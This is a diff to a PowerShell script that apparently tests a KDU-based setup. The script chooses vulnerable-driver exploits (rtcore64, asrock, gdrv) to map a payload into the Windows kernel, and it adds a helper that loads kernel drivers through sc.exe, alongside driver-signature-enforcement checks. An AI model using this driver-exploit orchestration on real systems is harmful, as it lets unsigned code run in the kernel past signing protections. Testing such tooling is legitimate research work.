@@ -87,8 +87,13 @@ $exploitInfo = @{}
 try {
     ($listed.output | ConvertFrom-Json) | ForEach-Object { $exploitInfo[$_.id] = $_ }
 } catch { }
+# Prefer a driver whose writes are usable for the mapper (virtual write is
+# enough; physical holes of WinRing0 are unsafe, blocklisted drivers unavailable).
 $payloadId = ''
-if ($exploitIds -contains 'gdrv') { $payloadId = 'gdrv' } elseif ($exploitIds.Count -gt 0) { $payloadId = $exploitIds[0] }
+foreach ($candidate in @('rtcore64', 'asrock', 'gdrv')) {
+    if ($exploitIds -contains $candidate) { $payloadId = $candidate; break }
+}
+if (-not $payloadId -and $exploitIds.Count -gt 0) { $payloadId = $exploitIds[0] }
 
 # ---------------------------------------------------------------------------
 foreach ($id in $exploitIds) {
@@ -146,8 +151,13 @@ foreach ($id in $exploitIds) {
 # ---------------------------------------------------------------------------
 # Payload mapping through the first physical-write exploit.
 # ---------------------------------------------------------------------------
+# Prefer a driver whose writes are usable for the mapper (virtual write is
+# enough; physical holes of WinRing0 are unsafe, blocklisted drivers unavailable).
 $payloadId = ''
-if ($exploitIds -contains 'gdrv') { $payloadId = 'gdrv' } elseif ($exploitIds.Count -gt 0) { $payloadId = $exploitIds[0] }
+foreach ($candidate in @('rtcore64', 'asrock', 'gdrv')) {
+    if ($exploitIds -contains $candidate) { $payloadId = $candidate; break }
+}
+if (-not $payloadId -and $exploitIds.Count -gt 0) { $payloadId = $exploitIds[0] }
 if ($payloadId) {
     $info = Invoke-Kdu @('--exploit', $payloadId, '--json', 'info')
     $ok = $info.code -eq 0
@@ -217,6 +227,18 @@ try {
 }
 
 # ---------------------------------------------------------------------------
+function Test-DriverLoad([string] $service, [string] $image) {
+    sc.exe stop $service *> $null
+    sc.exe delete $service *> $null
+    Start-Sleep -Seconds 1
+    if (-not (Test-Path $image)) {
+        return @{ loaded = $false; create = ''; start = "missing image: $image" }
+    }
+    $create = sc.exe create $service type= kernel start= demand binPath= $image 2>&1
+    $start = sc.exe start $service 2>&1
+    $loaded = $start -match 'STATE\s+:\s+4' -or $start -match 'RUNNING'
+    return @{ loaded = $loaded; create = ($create | Out-String); start = ($start | Out-String) }
+}
 # ---------------------------------------------------------------------------
 # DSE state / signature gating.
 #
@@ -360,6 +382,7 @@ $resultPath = Join-Path $OutDir 'result.json'
 $result | ConvertTo-Json -Depth 6 | Set-Content -Path $resultPath -Encoding UTF8
 Write-Host ("result: {0} ({1} checks, {2} failed)" -f $resultPath, $results.Count, $failed)
 exit $(if ($failed -eq 0) { 0 } else { 1 })
+
 
 
 
